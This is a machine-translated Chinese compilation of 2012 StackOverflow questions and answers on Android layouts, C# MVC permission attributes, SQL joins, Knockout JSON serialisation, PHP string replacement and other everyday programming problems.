# StackOverflow 问答 12461000-12461999

# android - 裁剪按钮和 FLAG_FULLSCREEN 交互？

> ID：12461001
> 
> 赞同：1
> 
> 时间：2012-09-17T14:05:28.743
> 
> 标签：android

我在全屏布局上以编程方式创建了一些按钮。也就是说，我在活动开始时有以下代码。

```
public void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);

    requestWindowFeature(Window.FEATURE_NO_TITLE);
    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN); 
```

..所以活动开始了，我创建了按钮。一切看起来都很好，按钮的大小和我期望在屏幕上的位置（右下角）完全正确，并且文本在按钮内完美居中。

然后当我使用互联网调用其他一些活动然后返回到原始时，就会出现问题。此时，当我的屏幕被重新绘制时，您会注意到轻微的抖动，就好像屏幕被稍微偏移绘制然后快速重新定位一样。生成的最终屏幕看起来基本没问题，除了底部的按钮出现裁剪。

这发生在我的三星 Galaxy SII 上，但在我的 Galaxy Tab 10.1 上没有明显问题。如果我注释掉这些行，这两个设备上也没有问题：

```
getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN); 
```

您可以在此处看到裁剪后的按钮：

![在此处输入图像描述](../Images/b6819e859f7106b9010079ca475186e0.png)

有没有人遇到过类似的问题？如果是这样，它是如何解决的？

**编辑：**我的直觉是，不知何故，状态栏只是被缓慢移除，而按钮被定位在屏幕上，而屏幕仍在向上滑动状态栏消失的过程中......但也许这个想法是一条红鲱鱼。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-24T11:25:16.260

您可以尝试在 onResume() 中更新按钮，对于每个按钮，您应该类似于：

```
 ViewGroup.LayoutParams params_btn1 = <params used to display programmatically the button>
 getWindowManager().updateViewLayout(button1, params_btn1); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-21T06:12:17.987

我不能重复这个问题，但尝试改变你的功能顺序。我意识到这通常不是可取的，但试一试。

> ```
> public void onCreate(Bundle savedInstanceState) {
> 
>     getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
>         WindowManager.LayoutParams.FLAG_FULLSCREEN);
> 
>     super.onCreate(savedInstanceState);
> 
>     requestWindowFeature(Window.FEATURE_NO_TITLE); 
> ```

# android - 按住 ImageButton 时，Android 在布局之间滑动

> ID：12461004
> 
> 赞同：1
> 
> 时间：2012-09-17T14:05:33.207
> 
> 标签：android, android-layout, slider

我有一张图片，并将其作为 ImageButton 包含在内（但 ImageView 可能也可以）。它看起来像是要向上拖动的东西，以便切换到设置界面。我已经研究了好几天了，查看了很多关于这个问题的页面（其中许多是关于 ViewPager 的），但没有一个是清楚的 - 其中一些说“使用 X 类”，其他人只是假设我知道很多事情我不。有一些确实有效，但它们是水平的。我发现的垂直的那些是难以理解和无法解释的。谁能用*通俗易懂*的方式解释一下，好吗？

基本上我需要的是：

*   我有 layout.xml 和 layout2.xml；
*   layout.xml 底部有一张图片；
*   当用户向上滑动该图像时，layout2 来自底部；
*   如果用户在释放图像时超过了 50%（或类似的值），它会一直向上滑动。如果用户在 50% 或之前，它会一直返回。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T16:56:38.803

[Android 有一个名为SlidingDrawer](http://developer.android.com/reference/android/widget/SlidingDrawer.html)的内置小部件来执行此操作。在您的情况下，layout.xml 底部的图像将被视为“句柄”，而 layout2.xml 将被视为“内容”。手柄可以是任何类型的小部件，可以是 Button、ImageButton、ImageView 等。如果您触摸或滑动手柄，它将滑动以覆盖您所描述的屏幕。

上面链接中的 Android 文档很好地解释了它，但如果您有具体问题，我可以尝试解释更多

# c# - C# 属性：使用枚举常量作为输入参数

> ID：12461005
> 
> 赞同：7
> 
> 时间：2012-09-17T14:05:34.180
> 
> 标签：c#, asp.net-mvc, custom-attributes, access-control

我正在尝试为我的 MVC 应用程序实现一种新的基于权限的访问方法；我们有几个**Permission Group**，每个组都包含一个**Permission**列表。例如，我们有`Invoices`包含`CreateInvoice,RemoveInvoice,etc`权限密钥的权限组。

在这种方法中，每个 mvc`Action`都应该需要特定的执行权限。我正在尝试通过 CustomAttributes 来做到这一点，如下所示：

```
public class InvoiceController : Controller
    {
        [RequirePermission(Permissions.Invoices.CreateInvoice)]
        public ActionResult Create()
        {
            return View();
        }
    } 
```

为了让开发人员更容易记住不同的权限组和权限密钥，我正在尝试创建一个预定义的权限列表，该列表应该是权限组和权限密钥的组合。但是由于在 C# 中使用属性参数的限制，我还不能让它工作。（**我不想制作一个超大的枚举器并将所有权限密钥放在那里**）

我的最后一次尝试是为每个权限组创建一个枚举器，然后在其中将权限键定义为枚举常量：

```
public class PermissionEnums
{
    [PermissionGroup(PermissionGroupCode.Invoice)]
    public enum Invoices
    {
        CreateInvoice = 1,
        UpdateInvoice = 2,
        RemoveInvoice = 3,
        ManageAttachments = 4
    }

    [PermissionGroup(PermissionGroupCode.UserAccounts)]
    public enum UserAccounts
    {
        Create = 1,
        ChangePassword = 2
    }
} 
```

如您所见，我们在这里有代码组合，使用`PermissionGroup`属性指定的权限组密钥和每个枚举常量上指定为数字代码的权限密钥代码。

RequirePermission 属性定义如下：

```
public class RequirePermissionAttribute : Attribute
{
    private Enum _Permission;

    public RequirePermissionAttribute(Enum Permission)
        : base()
    {
        _Permission = Permission;
    }
} 
```

但问题是类型的对象`Enum`不能用作属性参数。

任何建议/想法表示赞赏

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-18T12:34:56.330

我找到了解决方案，唯一需要更改的是构造参数的类型。而不是使用`Enum`你必须使用`object`：

```
public class RequirePermissionAttribute : AuthorizeAttribute
{
    private object _Permission;

    public RequirePermissionAttribute(object Permission)
        : base()
    {
        _Permission = Permission;
    }
} 
```

这是完整的代码：

```
/***************** Permission Groups And Keys *****************/
public static class Permissions
{
    [PermissionGroup(PermissionGroupCode.Invoice)]
    public enum Invoices
    {
        CreateInvoice = 1,
        UpdateInvoice = 2,
        RemoveInvoice = 3,
        ManageAttachments = 4
    }

    [PermissionGroup(PermissionGroupCode.UserAccounts)]
    public enum UserAccounts
    {
        Create = 1,
        ChangePassword = 2
    }
}

public enum PermissionGroupCode
{
    Invoice = 1,
    UserAccounts = 2,
    Members = 3
}

/***************** Attributes & ActionFilters *****************/

[AttributeUsage(AttributeTargets.Enum)]
public class PermissionGroupAttribute : Attribute
{
    private PermissionGroupCode _GroupCode;
    public PermissionGroupCode GroupCode
    {
        get
        {
            return _GroupCode;
        }
    }

    public PermissionGroupAttribute(PermissionGroupCode GroupCode)
    {
        _GroupCode = GroupCode;
    }
}

public class RequirePermissionAttribute : AuthorizeAttribute
{
    private object _RequiredPermission;

    public RequirePermissionAttribute(object RequiredPermission)
        : base()
    {
        _RequiredPermission = RequiredPermission;
    }

    protected override bool AuthorizeCore(HttpContextBase httpContext)
    {
        var permissionGroupMetadata = (PermissionGroupAttribute)_RequiredPermission.GetType().GetCustomAttributes(typeof(PermissionGroupAttribute), false)[0];

        var groupCode = permissionGroupMetadata.GroupCode;
        var permissionCode = Convert.ToInt32(_RequiredPermission);

        return HasPermission(currentUserId, groupCode, permissionCode);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-18T06:51:14.867

我不认为那可能我试图做你的事情并失败了：/对不起。

操作权限应与 Authorize 一起使用，您可以编写自己的 ovveride 编写如下内容：

```
 [AttributeUsage(AttributeTargets.All)]
    public sealed class CustomAuthorizeAttribute : AuthorizeAttribute
    {

   protected override bool AuthorizeCore(HttpContextBase httpContext)
    {
        if (httpContext == null)
            throw new ArgumentNullException("httpContext");

        //Its a piece of code from my app you can modify it to suit your needs or use the base one
        if (!new CustomIdentity(httpContext.User.Identity.Name).IsAuthenticated)
        {
            return false;
        }

        return true;
    }

    protected override void HandleUnauthorizedRequest(AuthorizationContext    filterContext)
    {
        base.HandleUnauthorizedRequest(filterContext);

     }

} 
```

然后在你的行动：

```
[CustomAuthorizeAttribute(Roles = "FE")]
public ActionResult Index()
{
    return RedirectToAction("Index", "Documents");
} 
```

但是，它仍然是您使用的字符串，并且要使其正常工作，您需要将其与自定义角色提供程序结合使用。很多麻烦，但在我看来是值得的。

# asp.net - 这个SQL语句怎么写？

> ID：12461009
> 
> 赞同：1
> 
> 时间：2012-09-17T14:05:49.547
> 
> 标签：asp.net, sql, database, visual-studio-2010

我有两张桌子：

1.  事件：

    -ID; 姓名; 开始事件；结束事件；个人ID；

2.  RegistracijaKorisnik:

    -ID; 我;

现在我写了这个：

```
SqlDataAdapter da = new SqlDataAdapter(
         "SELECT [id], [name], [eventstart], [eventend] " +
         "FROM [Event] " + 
         "WHERE NOT (([eventend] <= @start) OR ([eventstart] >= @end))",
       con); 
```

有了这个唯一的显示名称，eventstart，eventend。现在我想显示来自 Person 表的名称和来自 event 的 name、eventstart、eventend。在 Event 表中，我想将 Event 表中的 PersonID 连接到 Person 表中的 ID 字段。你能帮助我吗？

编辑：所有代码，不知道为什么不显示 p.ime

```
protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            DayPilotCalendar1.StartDate = DayPilot.Utils.Week.FirstDayOfWeek(new DateTime(2012, 09, 17));
            DayPilotCalendar1.DataSource = dbGetEvents(DayPilotCalendar1.StartDate, DayPilotCalendar1.Days);
            DataBind();
        }

    }

 protected DataTable dbGetEvents(DateTime start, int days)
    {

      SqlConnection con = new SqlConnection();
      con.ConnectionString = @"Data Source=.\SQLEXPRESS;Initial Catalog=Korisnik;Integrated Security=True";
      //SqlDataAdapter da = new SqlDataAdapter("SELECT [id], [name], [eventstart], [eventend] FROM [Event] WHERE NOT (([eventend] <= @start) OR ([eventstart] >= @end))", con);
     //SqlDataAdapter da = new SqlDataAdapter("select  e.id as EventId, e.name as EventName, e.eventstart, e.eventend, p.Id as PersonId, p.ime as PersonName from Event e inner join RegistracijaKorisnik p on e.PersonID=p.id where not (([eventend] <= @start) OR ([eventstart] >= @end))", con);
      //SqlDataAdapter da = new SqlDataAdapter("SELECT e.id, e.name, e.eventstart, e.eventend, p.ime FROM Event e INNER JOIN RegistracijaKorisnik p ON e.PersonID = p.id WHERE NOT ((e.eventend <= @start) OR (e.eventstart >= @end ))", con);
      SqlDataAdapter da = new SqlDataAdapter("SELECT e.id, e.name, e.eventstart, e.eventend, p.ime AS 'Person Name' FROM Event e INNER JOIN RegistracijaKorisnik p ON e.PersonID = p.id WHERE NOT ((e.eventend <= @start) OR (e.eventstart >= @end ))", con);
      da.SelectCommand.Parameters.AddWithValue("start", start);
      da.SelectCommand.Parameters.AddWithValue("end", start.AddDays(days));

      DataTable dt = new DataTable();
      da.Fill(dt);
      return dt; 

    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:09:13.267

`JOIN`两张表：

```
SELECT e.id, e.name, e.eventstart, e.eventend,
       p.Name + ' ' + p.Surname AS 'Person Name'
FROM Event e
INNER JOIN Person p ON e. PersonID = p.ID
WHERE NOT ((e.eventend <= @start) OR (e.eventstart >= @end )) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T14:10:36.137

```
select 
  e.id as EventId
  ,e.name as EventName
  ,e.startevent
  ,e.endevent
  ,p.Id as PersonId
  ,p.name as PersonName 
  ,p.surname as PersonSurname
  ,p.email
from Event e
join Person p on e.PersonId=p.Id
where not (([eventend] <= @start) OR ([eventstart] >= @end)) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T14:09:03.567

如果我正确理解您的问题，这只是一个简单的连接，如下所示：

```
SELECT e.id, e.name, e.eventstart, e.eventend, p.name
FROM Event e
   INNER JOIN Person p ON p.Id = e.ID
WHERE NOT ((e.eventend <= @start) OR (e.eventstart >= @end) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T14:16:15.243

您在两个表中具有相同的列名。

这个问题的解决方法是

*   您可以在查询中使用完全限定的列名，例如 tablename.columnname - 即 event.id、person.id 等或

*   您可以使用别名喜欢选择事件作为 e

这应该工作

# c# - FolderBrowserDialog 的替代品

> ID：12461016
> 
> 赞同：14
> 
> 时间：2012-09-17T14:06:01.810
> 
> 标签：c#, winforms, directory, openfiledialog, folderbrowserdialog

在 C# 中选择文件夹是否有替代方法？

理想情况下，我想使用 OpenFileDialog 来选择文件夹，或者至少是类似的东西。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-17T14:08:02.913

这里有[OpenFileOrFolder](https://github.com/scottwis/OpenFileOrFolderDialog)对话框，这里有另一个[FolderBrowserDialog](http://www.ookii.org/software/dialogs/)都是开源的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-10-20T21:45:37.170

**[Ookii Dialogs](https://github.com/ookii-dialogs)**库具有用于 Windows 窗体和 WPF 的文件夹浏览器对话框的实现

[![Ookii 文件夹浏览器对话框](../Images/8ccf1bea628c9b5d62adb786a4b134fc.png)](https://github.com/augustoproiete/ookii-dialogs-wpf)

> **Ookii.Dialogs.WinForms**
> 
> [https://github.com/augustoproiete/ookii-dialogs-winforms](https://github.com/augustoproiete/ookii-dialogs-winforms)

* * *

> **Ookii.Dialogs.Wpf**
> 
> [https://github.com/augustoproiete/ookii-dialogs-wpf](https://github.com/augustoproiete/ookii-dialogs-wpf)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2019-02-26T12:34:19.940

正是出于这个原因，我开发了[BetterFolderBrowser](https://github.com/Willy-Kimura/BetterFolderBrowser)。它是一个 .NET 库，通过提供易于使用的文件夹浏览体验来模拟`OpenFileDialog`对话窗口，从而满足您的需求。此外，由于它作为一个组件工作，您将能够在设计模式下轻松调整其属性。希望能帮助到你。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-17T14:09:37.610

我发现自己与您可能想要的最接近的是：

[http://www.codeproject.com/Articles/15059/C-File-Browser](http://www.codeproject.com/Articles/15059/C-File-Browser)

这是一个可以放置在对话框（窗体）上的控件。它允许选择文件或文件夹。这是我的实现的样子：

![在此处输入图像描述](../Images/9ce4b4859077e491be662565a96006be.png)

# javascript - 使用 TweenLite (JS) 淡化文本不起作用

> ID：12461018
> 
> 赞同：1
> 
> 时间：2012-09-17T14:06:06.627
> 
> 标签：javascript, html, html5-canvas, gsap

目前我正在用 html5/javascript 制作横幅（也是一种自学的方式，对我来说还是比较新的）并且我正在使用 tweenlite 库。我正在尝试在 html5 中制作横幅的最佳方式，所以我正在尝试所有这些不同的插件来制作相同的横幅。现在轮到 Greensock 推出新的 GSAP v12。

我希望很明显，atm 我不想使用 TweenLite/Max 以外的任何东西来解决这个问题。即使我想我也不能（文件大小限制）。

所以现在我的问题。我正在尝试同时使文本滑入和淡入。滑动工作完美，很容易，但褪色似乎没有做任何事情。

这是代码的一部分（请注意，我现在将其淡出，更容易测试）：

```
TweenMax.to(ctxTitle, 0.5, { ypos:titleToYpos, css:{alpha:0}, ease:Power2.easeOut, onUpdate:loopTitle });

function loopTitle() {
  ctxTitle.clearRect(0, 0, width, height);
  ctxTitle.fillText(title, ctxTitle.xpos, ctxTitle.ypos);
} 
```

如果我遗漏了什么，请随时询问！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T21:47:29.597

我注意到了几件事：

1）你试图补间上下文本身的css而不是canvas元素。

```
//BAD:
TweenLite.to(document.getElementById('canvas4').getContext('2d'), 0.5, {css:{alpha:0}});

//GOOD:
TweenLite.to(document.getElementById('canvas4'), 0.5, {css:{alpha:0}}); 
```

当然，您可以为处理 ypos 的上下文创建 1 个补间，为处理不透明度/alpha 的画布元素创建另一个补间。它们将完美同步运行。

2) 您使用的是非常旧版本的 GSAP 文件。从[http://www.greensock.com/v12/获取最新信息](http://www.greensock.com/v12/)

[如果您还需要其他任何东西，请不要犹豫，访问http://forums.greensock.com](http://forums.greensock.com)上的 GreenSock 论坛。

# jquery - 拖动 html 文本并将该文本拖放到 svg 图像上

> ID：12461024
> 
> 赞同：0
> 
> 时间：2012-09-17T14:06:35.890
> 
> 标签：jquery, html, svg, drag-and-drop

我有一个 ul li 格式的 html 文本列表，我想将其放在 svg 图像上。但是当我这样做时出现了一些问题。

我的 html 代码结构如下：

```
<html>
<body>
    <ul>
        <li>Lorum Ipsum </li>
        <li>Lorum Ipsum 2</li>
        <li><img src="..." /></li>
    </ul>

    <svg><image .../> <rect>...</rect> <circle>....</circle> </svg>

</body>
</html> 
```

我想将这个 Lorum Ipsum 文本拖到嵌套在 svg 标签中的图像标签上。

我该如何解决这个问题？我们还需要 html 标签中的文本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:15:50.720

```
<ul><li id="drag1" draggable="true" ondragstart="drag(event)">Lorum Ipsum</li></ul>

<svg  ><image id="div1" ondrop="drop(event)"
        ondragover="allowDrop(event)"/> <rect>...</rect> <circle>....</circle> </svg>

<script>
    function allowDrop(ev) {
        ev.preventDefault();
    }

    function drag(ev) {
        ev.dataTransfer.setData("Text", ev.target.id);
    }

    function drop(ev) {
        debugger;
        ev.preventDefault();
        var data = ev.dataTransfer.getData("Text");

        ev.target.appendChild(document.getElementById(data));

    }
</script> 
```

# html - HTML5 输入类型日历、颜色和范围

> ID：12461028
> 
> 赞同：0
> 
> 时间：2012-09-17T14:06:53.063
> 
> 标签：html, internet-explorer, firefox

在开发我的网站时，我遇到了一些关于 Firefox 和 Internet Explorer 等浏览器之间兼容性的问题。

我的文档开头还有这段代码：

```
 <!-- HTML5 Shim -->
        <!--[if lt IE 9]><script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->     
        <!-- Modernizr -->
        <script src="modernizr.js"></script>
        <!-- Webforms2 -->

        <!-- jQuery  -->
        <script src="js/jquery-1.4.3.min.js"></script>
        <script src="js/jquery-ui-1.8.5.min.js"></script>
        <!-- jQuery Color Picker -->
        <link rel="stylesheet" href="colorpicker.css">
        <script src="colorpicker.js"></script>
        <!-- jQuery Numeric Spinner -->
        <script src="spinner.js"></script>  
            <!-- jQuery Placehol 
            <script src="jquery.placehold-0.2.min.js"></script>  --> 
```

在我的页面正文上，我有：

```
 <!-- Script DATE  -->
    <script>
    var initDatepicker = function() {  
    $('input[type=date]').each(function() {  
        var $input = $(this);  
        $input.datepicker({  
            minDate: $input.attr('min'),  
            maxDate: $input.attr('max'),  
            dateFormat: 'dd/mm/yy'  
        });  
    });  
};  

if(!Modernizr.inputtypes.date){  
    $(document).ready(initDatepicker);  
};  
  </script>

  <!-- Script COLOR  -->
  <script>
  var initColorpicker = function() {  
    $('input[type=color]').each(function() {  
        var $input = $(this);  
        $input.ColorPicker({  
            onSubmit: function(hsb, hex, rgb, el) {  
                $(el).val(hex);  
                $(el).ColorPickerHide();  
            }  
        });  
    });  
};  

if(!Modernizr.inputtypes.color){  
    $(document).ready(initColorpicker);  
};  
  </script>

<!-- Script Slider -->
<script>
var initSlider = function() {  
    $('input[type=range]').each(function() {  
        var $input = $(this);  
        var $slider = $('<div id="' + $input.attr('id') + '" class="' + $input.attr('class') + '"></div>');  
        var step = $input.attr('step');  

        $input.after($slider).hide();  

        $slider.slider({  
            min: $input.attr('min'),  
            max: $input.attr('max'),  
            step: $input.attr('step'),  
            change: function(e, ui) {  
                $(this).val(ui.value);  
            }  
        });  
    });  
};
</script> 
```

我遇到的问题是关于 PHP 页面的，因为当我在 index.php 上时一切正常。

当我继续时`index.php?p=som_page`，无论 p 上的参数是什么，该脚本都不再起作用。

我有点迷茫，因为在页面上我只包含没有头部和主体的函数，只是包含的 div。

但是当我重新打开 index.php 时，一切都可以正常工作了。

仅当我使用 Firefox 或 Internet Explorer 时才会出现此问题。当我使用 Chrome 时，输入类型日期、颜色或范围都可以正常工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-07T17:59:54.123

目前，`<input type="color" name="favcolor">`IE、Firefox 或 Safari 不支持。 [http://www.w3schools.com/html/html5_form_input_types.asp](http://www.w3schools.com/html/html5_form_input_types.asp)

# python - 绘制大量数据点

> ID：12461033
> 
> 赞同：2
> 
> 时间：2012-09-17T14:07:16.927
> 
> 标签：python, matplotlib

我遇到了一个奇怪的问题：当我将非线性方程中的大量数据点存储到 3 个数组（x、y 和 z）中，然后尝试将它们绘制在 2D 图中（theta-phi plot，因此它的 2D ）。

我试图通过每 20 个数据点的采样点来消除需要绘制的点，因为 z 数据是近似周期性的。我选择了 z 值略高于零的那些点，以确保我为每个周期选择一个点。

当我尝试执行上述操作时，问题就出现了。我在图表上只得到了非常有限的点数，大约 152 个点，无论我如何更改我的初始数据点数量（当然，只要它超过一定数量）。 ![图形](../Images/90ce14d8b9f4aa1904924a4ad78578bc.png)

我怀疑这可能是我使用错误的某些命令，或者数组的容量比我预期的要小（似乎不太可能），有人可以帮我找出问题所在吗？

```
def drawstaticplot(m,n, d_n, n_o):
    counter=0
    for i in range(0,m):
        n=vector.rungekutta1(n, d_n)
        d_n=vector.rungekutta2(n, d_n, i)
        x1 = n[0]    
        y1 = n[1]
        z1 = n[2]
        if i%20==0:
            xarray.append(x1)
            yarray.append(y1)
            zarray.append(z1)
    for j in range(0,(m/20)-20):
        if (((zarray[j]-n_o)>0) and ((zarray[j+1]-n_o)<0)):
           counter= counter +1
           print zarray[j]-n_o,counter
           plotthetaphi(xarray[j],yarray[j],zarray[j])

def plotthetaphi(x,y,z):
    phi= math.acos(z/math.sqrt(x**2+y**2+z**2))
    theta = math.acos(x/math.sqrt(x**2 + y**2))
    plot(theta, phi,'.',color='red') 
```

此外，我尝试将以下[SO 问题](https://stackoverflow.com/questions/4082298/scatter-plot-with-a-huge-amount-of-data)中的代码应用于我的代码，我想要一个非常相似的结果，只是我的数据点不是随机生成的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T15:01:02.853

秀安，

我仍在调查您的问题，但有几点注意事项：

您可以执行以下操作，而不是循环并附加到数组：

# 选择每第 n 个元素：

```
# inside IPython console:
[2]: a=np.arange(0,10)

In [3]: a[::2] # here we select every 2nd element.
Out[3]: array([0, 2, 4, 6, 8]) 
```

所以不要在 m 的所有元素上计算 runga-kutta：

```
new_m = m[::20] # select every element of m. 
```

现在像这样调用你的函数：

```
def drawstaticplot(new_m,n, d_n, n_o):
    n=vector.rungekutta1(n, d_n)
    d_n=vector.rungekutta2(n, d_n, i)
    x1 = n[0]    
    y1 = n[1]
    z1 = n[2]
    xarray.append(x1)
    yarray.append(y1)
    zarray.append(z1)
    ... 
```

# 关于附加和迭代大型数据集：

`append`通常很慢，因为它复制整个数组然后堆叠新元素。相反，您已经知道 n 的大小，因此您可以这样做：

```
def drawstaticplot(new_m,n, d_n, n_o):
    # create the storage based on n,
    # notice i assumed that rungekutta, returns n the size of new_m, 
    # but you can change it.
    x,y,z = np.zeros(n.shape[0]),np.zeros(n.shape[0]), np.zeros(n.shape[0])

for idx, itme in enumerate(new_m): # notice the function enumerate, make it your friend!
    n=vector.rungekutta1(n, d_n)
    d_n=vector.rungekutta2(n, d_n, ite,)
    x1 = n[0]    
    y1 = n[1]
    z1 = n[2]
    #if i%20==0: # we don't need to check for the 20th element, m is already filtered...
    xarray[idx] = n[0]
    yarray[idx] = n[1]
    zarray[idx] = n[2]
    # is the second loop necessary?
    if (((zarray[idx]-n_o)>0) and ((zarray[j+1]-n_o)<0)): 
       print zarray[idx]-n_o,counter
       plotthetaphi(xarray[idx],yarray[idx],zarray[idx]) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:58:49.417

您可以使用此处建议的方法： [有效地为高密度区域创建密度图，为稀疏区域创建点，](https://stackoverflow.com/questions/10439961/efficiently-create-a-density-plot-for-high-density-regions-points-for-sparse-re/10452333#10452333) 例如点太多的直方图和密度低的点。或者，您也可以为 matplotlib 使用光栅化标志，从而加快 matplotlib。

# scala - ScalaCheck之前/之后/周围？

> ID：12461035
> 
> 赞同：2
> 
> 时间：2012-09-17T14:07:21.493
> 
> 标签：scala, specs2, scalacheck

specs2 具有诸如`Before`、`After`、`Around`等特征，以便能够将示例包装在设置/拆卸代码中。

是否有任何东西支持为ScalaCheck 属性的每个“迭代”设置和拆除测试基础设施，即ScalaCheck 要测试的每个值或一组值？

看起来 specs2 的各种 Before、After、Around 特征都是围绕返回或抛出 specs2 Result 实例而设计的，而 Prop 不是 Result。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T01:51:24.313

这已在最新的 1.12.2-SNAPSHOT 中得到修复。你现在可以写：

```
import org.specs2.ScalaCheck
import org.specs2.mutable.{Around, Specification}
import org.specs2.execute.Result

class TestSpec extends Specification with ScalaCheck {
  "test" >> prop { i: Int =>
    around(i must be_>(1))
  }

  val around = new Around {
    def around[T <% Result](t: =>T) = {
      ("testing a new Int").pp
      try { t }
      finally { "done".pp }
    }
  }    
} 
```

这将在属性的“主体”之前和之后执行代码。

您还可以更进一步，创建一个支持方法以将隐式传递`around`给您的 Props：

```
class TestSpec extends Specification with ScalaCheck {
  "test" >> propAround { i: Int =>
    i must be_>(1)
  }

  // use any implicit "Around" value in scope
  def propAround[T, R](f: T => R)
                      (implicit a: Around, 
                       arb: Arbitrary[T], shrink: Shrink[T], 
                       res: R => Result): Result =
    prop((t: T) => a(f(t)))

  implicit val around = new Around {
    def around[T <% Result](t: =>T) = {
      ("testing a new Int").pp
      try { t }
      finally { "done".pp }
    }
  }
} 
```

# json - 使用 ko.toJSON 进行 Knockout 序列化 - 如何忽略为空的属性

> ID：12461037
> 
> 赞同：18
> 
> 时间：2012-09-17T14:07:24.413
> 
> 标签：json, serialization, knockout.js, knockout-2.0

使用时：

```
var dataToSave = ko.toJSON(myViewModel); 
```

..是否可以**不**序列化为空的值？

序列化我当前的 viewModel 会创建大约 500Kb 的 JSON，其中大部分最终如下：

```
"SomeObject": {
    "Property1": 12345,
    "Property2": "Sometext",
    "Property3": null,
    "Property4": null,
    "Property5": null,
    "Property6": null,
    "Property7": null,
    "Property8": null,
    "Property9": false
} 
```

如果我可以让序列化程序忽略空值，那么这可以减少到：

```
"SomeObject": {
    "Property1": 12345,
    "Property2": "Sometext",
    "Property9": false
} 
```

**有什么想法可以指示序列化程序忽略空值吗？**

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-09-17T14:35:28.847

请记住，[ko.toJSON](http://knockoutjs.com/documentation/json-data.html)只是[JSON stringify](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/JSON/stringify)的修改。你可以传入一个[替换函数](http://msdn.microsoft.com/en-us/library/cc836459%28v=vs.94%29.aspx)。

作为在 Knockout 中使用替换函数的示例，我根据其中一个[淘汰教程整理了一个](http://learn.knockoutjs.com/#/?tutorial=collections)[JSFiddle](http://jsfiddle.net/GXBTS/23/)。注意和函数之间的区别。我们可以选择在我们的替换函数中不返回任何值，并且该项目将在 JSON 字符串中被跳过。`makeJson``makeCleanJson`

```
self.makeJson = function() {
    self.JsonInfo(ko.toJSON(self.availableMeals));
};

self.makeCleanJson = function() {
    self.JsonInfo(ko.toJSON(self.availableMeals, function(key, value) {
        if (value == null)
        {
            return;
        }
        else
        {
            return value;
        }
    }));
}; 
```

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-09-17T14:44:37.670

您可以将 toJSON 方法添加到您的视图模型并使用它来删除所有不需要的属性：

```
 ViewModel.prototype.toJSON = function() {
     var copy = ko.toJS(this);
     // remove any unneeded properties
     if (copy.unneedProperty == null) {
         delete copy.unneedProperty;
     }
     return copy;
 } 
```

您可能可以将其自动化以运行所有属性并删除空属性。

# php - 用php用下划线替换空格

> ID：12461039
> 
> 赞同：0
> 
> 时间：2012-09-17T14:07:25.893
> 
> 标签：php, replace

这是一个非常新手的问题，但我就是不知道问题出在哪里，所以请多多包涵...

这就是我想要实现的目标-->`$new = 'OMG_This_Is_A_One_Stupid_Error';`

这是我从这段代码中得到的——>`$new = 'OMG This Is A One Stupid_Error';`

```
<?php 
    $find = 'OMG This Is A One Stupid Error'; //just an example
    $offset = 0;
    $search = ' ';
    $length = strlen($search);
    $replace = '_';
    while($substring = strpos($find, $search,$offset))
    {
        $new =  substr_replace($find, $replace,$substring,$length);
        $offset = $substring + $search_length;
    }   
    echo $new;
?> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-17T14:08:44.417

使用[str_replace()](http://www.php.net/str_replace)函数：

```
<?php
    $old = 'OMG_This_Is_A_One_Stupid_Error';
    $new = str_replace(' ', '_', $old);
    echo $old; // will output OMG This Is A One Stupid error
?> 
```

反转参数，得到反转效果

```
<?php
    $old = 'OMG This Is A One Stupid_Error';
    $new = str_replace('_', ' ', $old);
    echo $old; // will output OMG_This_Is_A_One_Stupid error
?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:08:53.277

请允许我向您介绍[str_replace()](http://php.net/manual-lookup.php?pattern=str_replace)

```
$var = str_replace(' ', '_', $var); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:14:50.010

你可以使用[str_replace](http://php.net/manual/en/function.str-replace.php)

如果您只想将源字符串的下划线替换为空格，请使用以下命令：

```
$source = 'OMG This Is A One Stupid Error'; //just an example

// $new is: OMG_This_Is_A_One_Stupid_Error
$new = str_replace(' ', '_', $source); 
```

如果源字符串是较大字符串的子字符串，您可以这样做：

```
$source     = 'This is a question for SO. '
            . 'OMG This Is A One Stupid Error';
$to_replace = 'OMG This Is A One Stupid Error';
$target     = str_replace(' ', '_', $to_replace);

// Finally replace the target string
$new = str_replace($to_replace, $target, $source)

// $new is: This is a question for SO. OMG_This_Is_A_One_Stupid_Error 
```

# java - java.lang.ClassNotFoundException: com.microsoft.jdbc.sqlserver.SQLServerDriver : 我是否加载了正确的驱动程序？

